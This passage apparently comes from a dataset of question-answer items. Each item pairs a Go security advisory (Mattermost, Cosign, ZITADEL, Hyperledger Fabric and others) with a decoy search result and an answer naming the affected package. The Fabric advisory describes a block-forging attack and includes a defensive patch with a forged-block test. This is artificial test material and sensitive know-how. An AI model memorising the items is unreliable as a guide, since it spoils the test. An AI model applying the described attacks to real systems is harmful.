"gpt", "value": "The affected package is github.com/zitadel/zitadel github.com/zitadel/zitadel."}]}, {"id": "GHSA-p5pr-vm3j-jxxf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly validate the \"Show Full Name\" option in a few endpoints in Mattermost Boards, allowing a member to get the full name of another user even if the Show Full Name option was disabled.\u00a0\n\n. Top 1 search result is go:github.com/envoyproxy/envoy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-r6cc-7wj7-gfx2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Kubernetes is vulnerable to privilege escalation when a user that can create pods on Windows nodes running kubernetes-csi-proxy may be able to escalate to admin privileges on those nodes. Kubernetes clusters are only affected if they include Windows nodes running kubernetes-csi-proxy.\n. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kubernetes-csi/csi-proxy github.com/kubernetes-csi/csi-proxy."}]}, {"id": "GHSA-6944-6pmv-6mp2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Buffer Overflow vulnerability in free5gc 3.3.0 allows attackers to cause a denial of service via crafted PFCP message with malformed PFCP Heartbeat message whose Recovery Time Stamp IE length is mutated to zero.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/free5gc/free5gc."}]}, {"id": "GHSA-q27h-hw2v-x5jm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue in Free5gc v.3.3.0 allows a local attacker to cause a denial of service via the free5gc-compose component.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/free5gc/free5gc."}]}, {"id": "GHSA-vfp6-jrw2-99g9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nCosign is susceptible to a denial of service by an attacker controlled registry. An attacker who controls a remote registry can return a high number of attestations and/or signatures to Cosign and cause Cosign to enter a long loop resulting in an endless data attack. The root cause is that Cosign loops through all attestations fetched from the remote registry in `pkg/cosign.FetchAttestations`.\n\nThe attacker needs to compromise the registry or make a request to a registry they control. When doing so, the attacker must return a high number of attestations in the response to Cosign. The result will be that the attacker can cause Cosign to go into a long or infinite loop that will prevent other users from verifying their data. In Kyvernos case, an attacker whose privileges are limited to making requests to the cluster can make a request with an image reference to their own registry, trigger the infinite loop and deny other users from completing their admission requests. Alternatively, the attacker can obtain control of the registry used by an organization and return a high number of attestations instead the expected number of attestations.\n\nThe vulnerable loop in Cosign starts on line 154 below:\nhttps://github.com/sigstore/cosign/blob/004443228442850fb28f248fd59765afad99b6df/pkg/cosign/fetch.go#L135-L196\n\nThe `l` slice is controllable by an attacker who controls the remote registry.\n\nMany cloud-native projects consider the remote registry to be untrusted, including Crossplane, Notary and Kyverno. We consider the same to be the case for Cosign, since users are not in control of whether the registry returns the expected data.\n\nTUF's security model labels this type of vulnerability an [\"Endless data attack\"](https://theupdateframework.io/security/), but an attacker could use this as a type of rollback attack, in case the user attempts to deploy a patched version of a vulnerable image; The attacker could prevent this upgrade by causing Cosign to get stuck in an infinite loop and never complete.\n\n### Mitigation\nThe issue can be mitigated rather simply by setting a limit to the limit of attestations that Cosign will loop through. The limit does not need to be high to be within the vast majority of use cases and still prevent the endless data attack.. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/sigstore/cosign github.com/sigstore/cosign/v2."}]}, {"id": "GHSA-85jj-c9jr-9jhx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to perform proper authorization in the `/plugins/focalboard/api/v2/users` endpoint allowing an attacker who is a guest user and knows the ID of another user\u00a0to get their information (e.g. name, surname, nickname) via Mattermost Boards.\n\n. Top 1 search result is go:github.com/istio/istio. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-xvrc-2wvh-49vc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nIn certain versions of gitsign, Rekor public keys were fetched via the Rekor API, instead of through the local TUF client. If the upstream Rekor server happened to be compromised, gitsign clients could potentially be tricked into trusting incorrect signatures.\n\nThere is no known compromise the default public good instance (`rekor.sigstore.dev`) - anyone using this instance is unlikely to be affected.\n\n### Patches\n\nThis was fixed in v0.8.0 via https://github.com/sigstore/gitsign/pull/399\n\n### Workarounds\n\nn/a\n\n### References\n_Are there any links users can visit to find out more?_\n\nhttps://docs.sigstore.dev/about/threat-model/#sigstore-threat-model. Top 1 search result is go:github.com/lima-vm/lima. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/sigstore/gitsign."}]}, {"id": "GHSA-3487-3j7c-7gwj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to limit the log size of server logs allowing an attacker sending specially crafted requests to different endpoints to potentially overflow the log. \n\n. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-392h-r46j-q24p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue in OwnCast v.0.1.1 allows a remote attacker to execute arbitrary code and obtain sensitive information via the authHost parameter of the indieauth function.. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/owncast/owncast."}]}, {"id": "GHSA-6758-979h-249x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nA bug in the RoleBinding reflector used by `capsule-proxy` gives ServiceAccount tenant owners the right to list Namespaces of other tenants backed by the same owner kind and name.\n\n### Details\n\n- Tenant `solar`, owned by a ServiceAccount named `tenant-owner` in the Namespace `solar`\n- Tenant `wind`, owned by a ServiceAccount named `tenant-owner` in the Namespace `wind`\n\n> Please, notice the same ServiceAccount name, although in different namespaces.\n\nThe Tenant owner `solar` would be able to list the namespaces of the Tenant `wind` and vice-versa, although this is not correct.\n\nThe bug introduces an exfiltration vulnerability since allows the listing of Namespace resources of other Tenants, although just in some specific conditions:\n\n1. `capsule-proxy` runs with the `--disable-caching=false` (default value: `false`)\n2. Tenant owners are ServiceAccount, with the same resource name, but in different Namespaces.\n\nThe CVE doesn't allow any privilege escalation on the outer tenant Namespace-scoped resources, since the Kubernetes RBAC is enforcing this.. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/projectcapsule/capsule github.com/projectcapsule/capsule-proxy."}]}, {"id": "GHSA-xwh9-gc39-5298", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A race condition in go-resty can result in HTTP request body disclosure across requests.\n\nThis condition can be triggered by calling sync.Pool.Put with the same *bytes.Buffer more than once, when request retries are enabled and a retry occurs. The call to sync.Pool.Get will then return a bytes.Buffer that hasn't had bytes.Buffer.Reset called on it. This dirty buffer will contain the HTTP request body from an unrelated request, and go-resty will append the current HTTP request body to it, sending two bodies in one request.\n\nThe sync.Pool in question is defined at package level scope, so a completely unrelated server could receive the request body.. Top 1 search result is go:github.com/Kava-Labs/kava. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/go-resty/resty/v2."}]}, {"id": "GHSA-5r5h-q934-cccp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: In certain conditions for Calico Typha (v3.26.2, v3.25.1 and below), and Calico Enterprise Typha (v3.17.1, v3.16.3, v3.15.3 and below), a client TLS handshake can block the Calico Typha server indefinitely, resulting in denial of service. The TLS Handshake() call is performed inside the main server handle for loop without any timeout allowing an unclean TLS handshake to block the main loop indefinitely while other connections will be idle waiting for that handshake to finish.\n. Top 1 search result is go:github.com/pires/go-proxyproto. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/projectcalico/calico github.com/projectcalico/calico."}]}, {"id": "GHSA-2c7c-3mj9-8fqh", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The go-jose package is subject to a \"billion hashes attack\" causing denial-of-service when decrypting JWE inputs. This occurs when an attacker can provide a PBES2 encrypted JWE blob with a very large p2c value that, when decrypted, produces a denial-of-service.. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/go-jose/go-jose/v3 github.com/square/go-jose."}]}, {"id": "GHSA-wp76-cf2j-rqq7", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Headscale through 0.22.3 writes bearer tokens to info-level logs.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/juanfont/headscale."}]}, {"id": "GHSA-jcgv-3pfq-j4hr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to use\u00a0innerText /\u00a0textContent\u00a0when setting the channel name in the webapp during autocomplete, allowing an attacker to inject HTML to a victim's page by create a channel name that is valid HTML. No XSS is possible though.. Top 1 search result is go:github.com/containers/buildah. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-8pgv-569h-w5rw", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nThe grpc Unary Server Interceptor [opentelemetry-go-contrib/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327)\n\n```\n// UnaryServerInterceptor returns a grpc.UnaryServerInterceptor suitable\n// for use in a grpc.NewServer call.\nfunc UnaryServerInterceptor(opts ...Option) grpc.UnaryServerInterceptor {\n```\n  \nout of the box adds labels\n\n- `net.peer.sock.addr`\n- `net.peer.sock.port`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent.\n\n### Details\n\nAn attacker can easily flood the peer address and port for requests.  \n\n### PoC\n\nApply the attached patch to the example and run the client multiple times.  Observe how each request will create a unique histogram and how the memory consumption increases during it.\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use  [UnaryServerInterceptor](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/9d4eb7e7706038b07d33f83f76afbe13f53d171d/instrumentation/google.golang.org/grpc/otelgrpc/interceptor.go#L327), and does not filter any client IP address and ports via middleware or proxies, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities.\n\n* [GHSA-rcjv-mgp8-qvmr](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-rcjv-mgp8-qvmr) ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-5r5m-65gx-7vrh](https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh \"GHSA-5r5m-65gx-7vrh\") ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- [GHSA-cg3q-j54f-5p7p](https://github.com/advisories/GHSA-cg3q-j54f-5p7p \"GHSA-cg3q-j54f-5p7p\") ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected, a view removing the attributes can be used.\n\nThe other possibility is to disable grpc metrics instrumentation by passing [`otelgrpc.WithMeterProvider`](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/instrumentation/google.golang.org/grpc/otelgrpc/v0.45.0/instrumentation/google.golang.org/grpc/otelgrpc/config.go#L138) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322), to be released with v0.46.0, the attributes were removed.\n\n### References\n\n- [#4322](https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4322). Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is go.opentelemetry.io/contrib/instrumentation/google.golang.org/grpc/otelgrpc."}]}, {"id": "GHSA-w496-f5qq-m58j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly sanitize the request to\u00a0`/api/v4/redirect_location` allowing an\u00a0attacker,\u00a0sending a specially crafted request to `/api/v4/redirect_location`,\u00a0to fill up the memory due to caching large items.\n\n. Top 1 search result is go:github.com/containerd/containerd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8."}]}, {"id": "GHSA-rjjm-x32p-m3f7", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\ngnark provides a gadget in the standard library to allow optimized checking of the bitwidth of the inputs. The gadget works by constructing a fixed lookup table containing all valid entries, partitioning the input and checking that all parts are inside the lookup table. The range checker gadget did not take into account that the highest partition may be less than the width limit, allowing the inputs to be up to 16 bits wider than checked.\n\nRange checking gadget is extensively used in field emulation. Users using any dependant gadget (ECDSA verification, proof recursion etc.) is impacted.\n\nWe consider the impact of the vulnerability being low as the number of attacker-modifiable bits is significantly smaller compared to the bit-width of scalar field modulus and it won't be possible to construct inputs which would allow to overflow the scalar field.\n\n### Patches\n\nThe issue has been patched in the stable branch of gnark. \n\nDue to low severity of the issue no emergency release will be issued and we follow the existing release plan. Versions v0.9.2 and higher are patched.\n\n### Workarounds\n\nWe consider the issue very hard to exploit and do not recommend manual remediation. However, it is possible to perform manual bit decomposition using `std/math/bits` gadget.\n\n### References\n\nInitial issue https://github.com/Consensys/gnark/issues/897\n\n### Acknowledgement\n\nThe issue was reported by [@ultrainstinct30](https://github.com/ultrainstinct30).. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/consensys/gnark."}]}, {"id": "GHSA-2wmj-46rj-qm2w", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nZITADEL uses the notification triggering requests Forwarded or X-Forwarded-Host header to build the button link sent in emails for confirming a password reset with the emailed code. If this header is overwritten and a user clicks the link to a malicious site in the email, the secret code can be retrieved and used to reset the users password and take over his account.\n\nAccounts with MFA or Passwordless enabled can not be taken over by this attack.\n\n### Patches\n\nThe patched ZITADEL versions verify, that the auth requests instance is retrieved by the requests original domain (from the Forwarded or X-Forwarded-Host headers if available). If the instance can't be found using the original host or the auth request can't be found within that instance, ZITADEL throws an error.\n\n2.x versions are fixed on >= [2.41.6](https://github.com/zitadel/zitadel/releases/tag/v2.41.6)\n2.40.x versions are fixed on >= [2.40.10](https://github.com/zitadel/zitadel/releases/tag/v2.40.10)\n2.39.x versions are fixed on >= [2.39.9](https://github.com/zitadel/zitadel/releases/tag/v2.39.9)\n\nThe vulnerablility was introduced with 2.39.0.\n\n### Workarounds\n\nA ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.\n\n### References\n\nNone\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/zitadel/zitadel github.com/zitadel/zitadel github.com/zitadel/zitadel."}]}, {"id": "GHSA-4ghx-8jw8-p76q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly check a redirect URL parameter allowing for an\u00a0open redirect was possible when the user clicked \"Back to Mattermost\" after providing a invalid custom url scheme in /oauth/{service}/mobile_login?redirect_to=\n\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-4qhc-v8r6-8vwm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault and Vault Enterprise inbound client requests triggering a policy check can lead to an unbounded consumption of memory. A large number of these requests may lead to denial-of-service. Fixed in Vault 1.15.2, 1.14.6, and 1.13.10.. Top 1 search result is go:github.com/mattermost/mattermost. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-v9w2-543f-h69m", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: # Short summary\n\nCombining two molecules to one another, called \"cross-linking\" results in a molecule with a chemical formula that is composed of all atoms of the original two molecules. \n\nIn Fabric, one can take a block of transactions and cross-link the transactions in a way that alters the way the peers parse the transactions. If a first peer receives a block `B` and a second peer receives a block identical to `B` but with the transactions being cross-linked, the second peer will parse transactions in a different way and thus its world state will deviate from the first peer. \n\nOrderers or peers cannot detect that a block has its transactions cross-linked, because there is a vulnerability in the way Fabric hashes the transactions of blocks. It simply and naively concatenates them, which is insecure and lets an adversary craft a \"cross-linked block\" (block with cross-linked transactions) which alters the way peers process transactions. \nFor example, it is possible to select a transaction and manipulate a peer to completely avoid processing it, without changing the computed hash of the block.\n\nAdditional validations have been added in v2.2.14 and v2.5.5 to detect potential cross-linking issues before processing blocks.\n\n## Impact\nIn V1 and V2, we only have a crash fault tolerant orderer and as such, the security model Fabric operates in is that the orderer is honest,\nbut peers may be malicious. As such, a peer that replicates a block from a malicious peer can have a state fork.\n\nIn V3 which we did not a release a GA yet (only a preview), we have a byzantine fault tolerant orderering service, so the security model that Fabric operates in such a case includes malicious orderers. If the orderer is malicious, it can cause state forks for peers, and can infect non-malicious orderers with cross-linked blocks.\n\n# Long summary\n\nIn order to create a signature on a big chunk of data  such as a block, the data needs to be \"compressed\" first to the input size of the signature algorithm.\n\nIn Fabric's case, we use a hash function which compressed a Fabric block from arbitrary size to a 32 byte string.\n\nIn order to understand the problem we need to be more specific: The block structure has three parts to it: (1) Header, (2) Transactions, and (3) Metadata.\n\nWhen hashing the block, the header and metadata are stitched together and then hashed, and this hash of the header and the metadata is what signed (it's a simplification but let's not get into details)\n\nHowever, the transactions of the block are not part of the above hash. Instead, the header contains a hash, called the \"Data hash\" and despite the fact that in the comments it is said: \"// The hash of the BlockData, by MerkleTree\", actually it is far from being the case, and that is where our problem lies.\n\nThe problem is that the way the transactions are hashed gives an attacker some freedom in manipulating the data. \n\nTo create the Data Hash, the transactions in the block are concatenated to one another, creating a big long byte array and then this big long byte array is hashed, and this is essentially the Data Hash.\n\nThe transactions in the block are a list of raw byte arrays, and when they are concatenated they look like this:\n\n`|$$$$$$$$$$$$|*************|@@@@@@@@@@@@|%%%%%%%%%|`  (The vertical lines \" | \" represent how transactions are separated in a block.)\n\nWhen the transactions are concatenated in order to be hashed, the payload that is hashed is: \n`$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%`\n\nAn adversary can't change the bytes of the concatenation, however what it can do, is to modify how transactions are encoded in the block:\n\nFor example, consider an adversary wants to manipulate a peer to skip the second transaction (******).\n\nIt can then create a block with the transactions as follows:\n\n`|$$$$$$$$$$$$*************|@@@@@@@@@@@@|%%%%%%%%%| `\n\nNotice that a block with the above transactions has the same concatenation of bytes as the original block, but the block has one less transaction - the first transaction is a concatenation of the first and second transactions in the original block.\n\nWhen the peer receives this block, it looks at the first transaction and when it parses it, it completely ignores the ***** bytes, (we will see why soon), and so, an adversary can create a block with the same hash but different transactions and this would create a fork in the network.\n \nI made a small PoC where I created a block with 2 transactions (by invoking two chaincodes at the same time) with a Raft orderer:\n\n```\n    [e][OrdererOrg.orderer] 2023-10-14 23:07:34.076 CEST 0079 INFO [orderer.consensus.etcdraft] propose -> Created block [10] with 2 transactions, there are 0 blocks in flight channel=testchannel node=1\n```\n\nBut right after creating the block, I just modified only its transaction content (without modifying the block hash) and then the peers only detect a single transaction inside that block:\n \n```\n    [e][Org2.peer0] 2023-10-14 23:07:34.079 CEST 0099 INFO [kvledger] commit -> [testchannel] Committed block [10] with 1 transaction(s) in 0ms (state_validation=0ms block_and_pvtdata_commit=0ms state_commit=0ms) commitHash=[c5ecca818da9319af2f276dd01cd1337938f20c3535dd23f95a33933a114fe84]\n```\n\nThe important takeaway from this experiment is that the peer does not detect any tempering was done to the block. If an attacker performs this attack, the network can be forked silently and no one will notice the network was forked until it's too late.\n\n \n\n# Patches\nHere is the patch I propose (the explanation is further below): \n\n```\ndiff --git a/internal/peer/gossip/mcs.go b/internal/peer/gossip/mcs.go\nindex b46df8b6a..9c3b5c8fd 100644\n--- a/internal/peer/gossip/mcs.go\n+++ b/internal/peer/gossip/mcs.go\n@@ -150,6 +150,10 @@ func (s *MSPMessageCryptoService) VerifyBlock(chainID common.ChannelID, seqNum u\n \t\treturn fmt.Errorf(\"Block with id [%d] on channel [%s] does not have metadata. Block not valid.\", block.Header.Number, chainID)\n \t}\n \n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n+\n \t// - Verify that Header.DataHash is equal to the hash of block.Data\n \t// This is to ensure that the header is consistent with the data carried by this block\n \tif !bytes.Equal(protoutil.BlockDataHash(block.Data), block.Header.DataHash) {\ndiff --git a/orderer/common/cluster/util.go b/orderer/common/cluster/util.go\nindex e229bebfc..05b1bfaa9 100644\n--- a/orderer/common/cluster/util.go\n+++ b/orderer/common/cluster/util.go\n@@ -260,6 +260,9 @@ func VerifyBlockHash(indexInBuffer int, blockBuff []*common.Block) error {\n \tif block.Header == nil {\n \t\treturn errors.New(\"missing block header\")\n \t}\n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n \tseq := block.Header.Number\n \tdataHash := protoutil.BlockDataHash(block.Data)\n \t// Verify data hash matches the hash in the header\ndiff --git a/orderer/consensus/smartbft/verifier.go b/orderer/consensus/smartbft/verifier.go\nindex 2b9fdfc4c..f232a1eae 100644\n--- a/orderer/consensus/smartbft/verifier.go\n+++ b/orderer/consensus/smartbft/verifier.go\n@@ -237,6 +237,10 @@ func verifyHashChain(block *cb.Block, prevHeaderHash string) error {\n \t\treturn errors.Errorf(\"previous header hash is %s but expected %s\", thisHdrHashOfPrevHdr, prevHeaderHash)\n \t}\n \n+\tif err := protoutil.VerifyTransactionsAreWellFormed(block); err != nil {\n+\t\treturn err\n+\t}\n+\n \tdataHash := hex.EncodeToString(block.Header.DataHash)\n \tactualHashOfData := hex.EncodeToString(protoutil.BlockDataHash(block.Data))\n \tif dataHash != actualHashOfData {\ndiff --git a/protoutil/blockutils.go b/protoutil/blockutils.go\nindex 8527869e4..fca3c386f 100644\n--- a/protoutil/blockutils.go\n+++ b/protoutil/blockutils.go\n@@ -10,6 +10,7 @@ import (\n \t\"bytes\"\n \t\"crypto/sha256\"\n \t\"encoding/asn1\"\n+\t\"encoding/base64\"\n \t\"fmt\"\n \t\"math/big\"\n \n@@ -298,3 +299,35 @@ func searchConsenterIdentityByID(consenters []*cb.Consenter, identifier uint32)\n \t}\n \treturn nil\n }\n+\n+func VerifyTransactionsAreWellFormed(block *cb.Block) error {\n+\tif block == nil || block.Data == nil || len(block.Data.Data) == 0 {\n+\t\treturn nil\n+\t}\n+\n+\tfor i, rawTx := range block.Data.Data {\n+\t\tenv := &cb.Envelope{}\n+\t\tif err := proto.Unmarshal(rawTx, env); err != nil {\n+\t\t\treturn fmt.Errorf(\"transaction %d is invalid: %v\", i, err)\n+\t\t}\n+\n+\t\tif len(env.Payload) == 0 {\n+\t\t\treturn fmt.Errorf(\"transaction %d has no payload\", i)\n+\t\t}\n+\n+\t\tif len(env.Signature) == 0 {\n+\t\t\treturn fmt.Errorf(\"transaction %d has no signature\", i)\n+\t\t}\n+\n+\t\texpected := MarshalOrPanic(env)\n+\t\tif len(expected) < len(rawTx) {\n+\t\t\treturn fmt.Errorf(\"transaction %d has %d trailing bytes\", i, len(rawTx)-len(expected))\n+\t\t}\n+\t\tif !bytes.Equal(expected, rawTx) {\n+\t\t\treturn fmt.Errorf(\"transaction %d (%s) does not match its raw form (%s)\", i,\n+\t\t\t\tbase64.StdEncoding.EncodeToString(expected), base64.StdEncoding.EncodeToString(rawTx))\n+\t\t}\n+\t}\n+\n+\treturn nil\n+}\ndiff --git a/protoutil/blockutils_test.go b/protoutil/blockutils_test.go\nindex b2159da9f..2871483f1 100644\n--- a/protoutil/blockutils_test.go\n+++ b/protoutil/blockutils_test.go\n@@ -489,3 +489,109 @@ func TestBlockSignatureVerifierByCreator(t *testing.T) {\n \trequire.Len(t, signatureSet, 1)\n \trequire.Equal(t, []byte(\"creator1\"), signatureSet[0].Identity)\n }\n+\n+func TestVerifyTransactionsAreWellFormed(t *testing.T) {\n+\toriginalBlock := &cb.Block{\n+\t\tData: &cb.BlockData{\n+\t\t\tData: [][]byte{\n+\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t}),\n+\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\tPayload:   []byte{7, 8, 9},\n+\t\t\t\t\tSignature: []byte{10, 11, 12},\n+\t\t\t\t}),\n+\t\t\t},\n+\t\t},\n+\t}\n+\n+\tforgedBlock := proto.Clone(originalBlock).(*cb.Block)\n+\ttmp := make([]byte, len(forgedBlock.Data.Data[0])+len(forgedBlock.Data.Data[1]))\n+\tcopy(tmp, forgedBlock.Data.Data[0])\n+\tcopy(tmp[len(forgedBlock.Data.Data[0]):], forgedBlock.Data.Data[1])\n+\tforgedBlock.Data.Data = [][]byte{tmp} // Replace transactions {0,1} with transaction {0 || 1}\n+\n+\tfor _, tst := range []struct {\n+\t\tname          string\n+\t\texpectedError string\n+\t\tblock         *cb.Block\n+\t}{\n+\t\t{\n+\t\t\tname: \"empty block\",\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"no block data\",\n+\t\t\tblock: &cb.Block{},\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"no transactions\",\n+\t\t\tblock: &cb.Block{Data: &cb.BlockData{}},\n+\t\t},\n+\t\t{\n+\t\t\tname: \"single transaction\",\n+\t\t\tblock: &cb.Block{Data: &cb.BlockData{Data: [][]byte{marshalOrPanic(&cb.Envelope{\n+\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t})}}},\n+\t\t},\n+\t\t{\n+\t\t\tname:  \"good block\",\n+\t\t\tblock: originalBlock,\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"forged block\",\n+\t\t\tblock:         forgedBlock,\n+\t\t\texpectedError: \"transaction 0 has 10 trailing bytes\",\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"no signature\",\n+\t\t\texpectedError: \"transaction 0 has no signature\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tPayload: []byte{1, 2, 3},\n+\t\t\t\t\t\t}),\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"no payload\",\n+\t\t\texpectedError: \"transaction 0 has no payload\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t\t\t}),\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"transaction invalid\",\n+\t\t\texpectedError: \"transaction 0 is invalid: proto: cannot parse invalid wire-format data\",\n+\t\t\tblock: &cb.Block{\n+\t\t\t\tData: &cb.BlockData{\n+\t\t\t\t\tData: [][]byte{\n+\t\t\t\t\t\tmarshalOrPanic(&cb.Envelope{\n+\t\t\t\t\t\t\tPayload:   []byte{1, 2, 3},\n+\t\t\t\t\t\t\tSignature: []byte{4, 5, 6},\n+\t\t\t\t\t\t})[9:],\n+\t\t\t\t\t},\n+\t\t\t\t},\n+\t\t\t},\n+\t\t},\n+\t} {\n+\t\tt.Run(tst.name, func(t *testing.T) {\n+\t\t\terr := protoutil.VerifyTransactionsAreWellFormed(tst.block)\n+\t\t\tif tst.expectedError == \"\" {\n+\t\t\t\trequire.NoError(t, err)\n+\t\t\t} else {\n+\t\t\t\trequire.EqualError(t, err, tst.expectedError)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n\n```\n\nThe idea is as follows:\n\nWhen we validate that the block's transactions match the hash in the header, we not only hash the transactions are earlier, 